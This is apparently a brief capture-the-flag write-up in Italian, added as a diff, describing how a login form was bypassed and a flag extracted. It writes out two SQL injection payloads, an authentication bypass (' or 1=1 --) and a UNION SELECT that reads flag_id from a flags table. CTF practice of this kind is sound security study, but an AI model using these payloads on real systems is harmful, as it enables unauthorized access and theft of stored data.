@@ -1,0 +1,5 @@
+ho provato ad entrare login
+' or 1=1 -- password random tanto lo commeta. 
+Dentro vedo che mostra a video il nume utente e con una union al 2 campo 
+ union select 1, flag_id,2 from flags -- 
+ottengo la flag
